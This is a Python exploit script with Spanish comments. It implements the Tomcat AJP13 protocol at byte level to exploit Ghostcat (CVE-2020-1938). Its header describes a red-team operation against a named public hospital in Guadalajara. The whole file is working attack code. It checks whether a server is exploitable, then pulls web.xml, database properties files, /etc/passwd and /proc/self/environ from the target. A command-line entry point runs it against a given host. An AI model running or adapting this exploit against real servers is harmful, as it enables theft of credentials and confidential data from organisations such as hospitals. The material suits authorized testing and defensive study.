#!/usr/bin/env python3
"""
🛡️ HCG Framework - AJP13 Protocol Implementation (Ghostcat - CVE-2020-1938)
[CLASSIFIED]: CONFIDENTIAL - HCG Red Team Operation
[SCOPE]: OPD Hospital Civil de Guadalajara (CONV-0221-JAL-HCG-2026)

Implementación propia del protocolo AJP13 a nivel de bytes para:
- Fingerprinting de servicios Tomcat
- Detección de configuración de secret
- Explotación Ghostcat (CVE-2020-1938) si está disponible
- Lectura arbitraria de archivos mediante atributos javax.servlet.include.*

Referencias:
- https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
- CNVD-2020-10487
"""

import socket
import struct
from typing import Optional, Dict, List, Any, Tuple


class AJP13Codec:
    """
    Codec AJP13 con implementación manual de empaquetado/desempaquetado BER-like.
    
    Permite control granular sobre:
    - Construcción de paquetes ForwardRequest
    - Manejo de atributos especiales para LFI
    - Detección de secret configurado
    - Análisis diferencial de respuestas
    """
    
    # Códigos de método HTTP en AJP13
    METHODS = {
        'OPTIONS': 1, 'GET': 2, 'HEAD': 3, 'POST': 4,
        'PUT': 5, 'DELETE': 6, 'TRACE': 7, 'PROPFIND': 8
    }
    
    # Headers comunes codificados (0xA000 + code)
    COMMON_HEADERS = [
        "SC_REQ_ACCEPT", "SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING",
        "SC_REQ_ACCEPT_LANGUAGE", "SC_REQ_AUTHORIZATION", "SC_REQ_CONNECTION",
        "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE",
        "SC_REQ_COOKIE2", "SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER",
        "SC_REQ_USER_AGENT"
    ]
    
    # Atributos especiales para inclusión de servlets
    ATTRIBUTES = [
        "context", "servlet_path", "remote_user", "auth_type", "query_string",
        "route", "ssl_cert", "ssl_cipher", "ssl_session", "req_attribute",
        "ssl_key_size", "secret", "stored_method"
    ]
    
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout
        
    def _pack_string(self, s: Optional[str]) -> bytes:
        """Empaqueta string en formato AJP13 (length-prefixed, null-terminated)."""
        if s is None:
            return struct.pack(">h", -1)
        encoded = s.encode('utf-8')
        return struct.pack(f">H{len(encoded)}sb", len(encoded), encoded, 0)
    
    def _unpack_string(self, stream: bytes, offset: int) -> Tuple[Optional[str], int]:
        """Desempaqueta string desde offset, retorna (string, nuevo_offset)."""
        if offset + 2 > len(stream):
            return None, offset
        size = struct.unpack_from(">h", stream, offset)[0]
        offset += 2
        if size == -1:
            return None, offset
        if offset + size + 1 > len(stream):
            return None, offset
        data = stream[offset:offset + size]
        offset += size + 1  # +1 para null terminator
        return data.decode('utf-8', errors='replace'), offset
    
    def build_forward_request(
        self,
        target_host: str,
        req_uri: str = "/",
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        attributes: Optional[List[Dict[str, Any]]] = None
    ) -> bytes:
        """
        Construye un paquete AJP13 ForwardRequest (code 0x02).
        
        Args:
            target_host: Host objetivo para el request
            req_uri: URI a solicitar (ej: /asdf para Ghostcat)
            method: Método HTTP (GET, POST, etc.)
            headers: Headers HTTP adicionales
            attributes: Atributos AJP especiales (para Ghostcat usar javax.servlet.include.*)
            
        Returns:
            Paquete AJP13 completo listo para enviar
        """
        # Header del mensaje AJP13
        prefix_code = 0x02  # ForwardRequest
        method_code = self.METHODS.get(method.upper(), 2)
        
        # Construir payload principal
        payload = struct.pack("bb", prefix_code, method_code)
        payload += self._pack_string("HTTP/1.1")
        payload += self._pack_string(req_uri)
        payload += self._pack_string(target_host)
        payload += self._pack_string(None)  # remote_host
        payload += self._pack_string(target_host)  # server_name
        payload += struct.pack(">h?", 80, False)  # port, is_ssl
        
        # Headers
        req_headers = headers or {
            'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml',
            'SC_REQ_CONNECTION': 'keep-alive',
            'SC_REQ_CONTENT_LENGTH': '0',
            'SC_REQ_HOST': target_host,
            'SC_REQ_USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0'
        }
        payload += struct.pack(">H", len(req_headers))
        for h_name, h_value in req_headers.items():
            if h_name.startswith("SC_REQ"):
                try:
                    code = self.COMMON_HEADERS.index(h_name) + 1
                    payload += struct.pack("BB", 0xA0, code)
                except ValueError:
                    payload += self._pack_string(h_name)
            else:
                payload += self._pack_string(h_name)
            payload += self._pack_string(h_value)
        
        # Atributos (crítico para Ghostcat)
        if attributes:
            for attr in attributes:
                a_name = attr.get('name', '')
                try:
                    code = self.ATTRIBUTES.index(a_name) + 1
                    payload += struct.pack("b", code)
                except ValueError:
                    continue
                    
                if a_name == "req_attribute":
                    aa_name, a_value = attr.get('value', ('', ''))
                    payload += self._pack_string(aa_name)
                    payload += self._pack_string(a_value)
                else:
                    payload += self._pack_string(attr.get('value', ''))
        
        payload += struct.pack("B", 0xFF)  # Fin de atributos
        
        # Wrapper final con longitud
        header = struct.pack(">bbH", 0x41, 0x42, len(payload))
        return header + payload
    
    def build_file_read_request(self, file_path: str) -> bytes:
        """
        Construye paquete especial para lectura de archivos vía Ghostcat.
        
        Usa los atributos javax.servlet.include.* para forzar la inclusión
        de archivos locales en la respuesta.
        
        Args:
            file_path: Ruta del archivo a leer (ej: /WEB-INF/web.xml)
            
        Returns:
            Paquete AJP13 configurado para LFI
        """
        attributes = [
            {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
            {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', file_path]},
            {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
        ]
        return self.build_forward_request(
            target_host="localhost",
            req_uri="/asdf",
            method="GET",
            attributes=attributes
        )
    
    def send_recv(self, host: str, port: int, packet: bytes) -> Dict[str, Any]:
        """
        Envía paquete AJP13 y recibe respuesta.
        
        Args:
            host: IP o hostname del servidor Tomcat
            port: Puerto AJP13 (típicamente 8009)
            packet: Paquete AJP13 a enviar
            
        Returns:
            Diccionario con: status_code, headers, body, raw_response
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        try:
            sock.connect((host, port))
            sock.sendall(packet)
            
            response_data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
                
                # Verificar si tenemos respuesta completa
                if len(response_data) >= 4:
                    _, data_len = struct.unpack_from(">HH", response_data, 0)
                    if len(response_data) >= 4 + data_len:
                        break
            
            return self._parse_response(response_data)
            
        except socket.timeout:
            return {"error": "timeout", "body": None}
        except ConnectionRefusedError:
            return {"error": "connection_refused", "body": None}
        except Exception as e:
            return {"error": str(e), "body": None}
        finally:
            sock.close()
    
    def _parse_response(self, data: bytes) -> Dict[str, Any]:
        """Parsea respuesta AJP13 en componentes."""
        result = {
            "status_code": None,
            "headers": {},
            "body": b"",
            "raw_response": data
        }
        
        offset = 0
        while offset < len(data):
            if offset + 4 > len(data):
                break
                
            magic, length = struct.unpack_from(">HH", data, offset)
            offset += 4
            
            if magic != 0x4142:  # AB
                break
                
            if offset + length > len(data):
                break
                
            prefix_code = data[offset]
            offset += 1
            
            if prefix_code == 0x03:  # SEND_HEADERS
                if offset + 2 <= len(data):
                    status_code, = struct.unpack_from(">H", data, offset)
                    result["status_code"] = status_code
                    offset += 2
                
                # Status message
                msg, offset = self._unpack_string(data, offset)
                
                # Headers count
                if offset + 2 <= len(data):
                    num_headers, = struct.unpack_from(">H", data, offset)
                    offset += 2
                    
                    for _ in range(num_headers):
                        # Header name (code o string)
                        code, = struct.unpack_from(">H", data, offset)
                        offset += 2
                        if code > 0xA000:
                            h_name = self.COMMON_HEADERS[code - 0xA001 - 1] if code - 0xA001 - 1 < len(self.COMMON_HEADERS) else f"UNKNOWN_{code}"
                        else:
                            h_name, offset = self._unpack_string(data, offset - 2)
                            offset = offset  # ya ajustado
                        
                        h_value, offset = self._unpack_string(data, offset)
                        result["headers"][h_name] = h_value
                        
            elif prefix_code == 0x04:  # SEND_BODY_CHUNK
                if offset + 2 <= len(data):
                    chunk_len, = struct.unpack_from(">H", data, offset)
                    offset += 2
                    if chunk_len > 0 and offset + chunk_len <= len(data):
                        result["body"] += data[offset:offset + chunk_len]
                        offset += chunk_len
                    offset += 1  # null terminator
                    
            elif prefix_code == 0x05:  # END_RESPONSE
                break
                
        return result
    
    def check_ghostcat(self, host: str, port: int = 8009) -> Tuple[bool, Optional[str]]:
        """
        Verifica si Ghostcat (CVE-2020-1938) es explotable.
        
        Intenta leer /WEB-INF/web.xml y analiza la respuesta.
        Si el secret está configurado, la conexión será rechazada.
        
        Args:
            host: IP del servidor Tomcat
            port: Puerto AJP13
            
        Returns:
            (vulnerable, error_msg): vulnerable=True si se puede leer archivos
        """
        packet = self.build_file_read_request('/WEB-INF/web.xml')
        response = self.send_recv(host, port, packet)
        
        if response.get("error"):
            return False, response.get("error")
        
        body = response.get("body", b"")
        
        # Si obtenemos XML en lugar de HTML, es vulnerable
        if b'<?xml' in body or b'<web-app' in body or b'</web-app>' in body:
            return True, None
        
        # Si la respuesta contiene contenido de web.xml
        if b'<!DOCTYPE' not in body and len(body) > 100:
            return True, None
            
        return False, "Response does not contain expected file content"
    
    def read_file(self, host: str, port: int, file_path: str) -> Optional[bytes]:
        """
        Lee archivo remoto vía Ghostcat.
        
        Args:
            host: IP del servidor Tomcat
            port: Puerto AJP13
            file_path: Ruta del archivo a leer
            
        Returns:
            Contenido del archivo o None si falló
        """
        packet = self.build_file_read_request(file_path)
        response = self.send_recv(host, port, packet)
        return response.get("body")
    
    def enumerate_files(
        self,
        host: str,
        port: int = 8009,
        file_list: Optional[List[str]] = None
    ) -> Dict[str, bytes]:
        """
        Enumera y extrae múltiples archivos de un Tomcat vulnerable.
        
        Args:
            host: IP del servidor
            port: Puerto AJP13
            file_list: Lista de archivos a intentar leer
            
        Returns:
            Diccionario {archivo: contenido} para los exitosos
        """
        if file_list is None:
            file_list = [
                '/WEB-INF/web.xml',
                '/WEB-INF/classes/application.properties',
                '/WEB-INF/classes/database.properties',
                '/META-INF/context.xml',
                '/etc/passwd',
                '/proc/self/environ'
            ]
        
        results = {}
        for f in file_list:
            content = self.read_file(host, port, f)
            if content and len(content) > 0:
                results[f] = content
                
        return results


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Uso: python ajp13.py <target_host> [port]")
        print("Ejemplo: python ajp13.py 10.254.3.193 8009")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8009
    
    codec = AJP13Codec()
    
    print(f"[*] Verificando Ghostcat en {target}:{port}")
    vulnerable, error = codec.check_ghostcat(target, port)
    
    if vulnerable:
        print(f"[+] ✅ Ghostcat EXPLOTABLE - secret NO configurado")
        print("[*] Extrayendo archivos críticos...")
        
        files = codec.enumerate_files(target, port)
        for path, content in files.items():
            print(f"\n=== {path} ===")
            print(content[:500].decode('utf-8', errors='replace'))
            if len(content) > 500:
                print(f"... ({len(content)} bytes total)")
    else:
        print(f"[-] ❌ Ghostcat NO explotable: {error}")
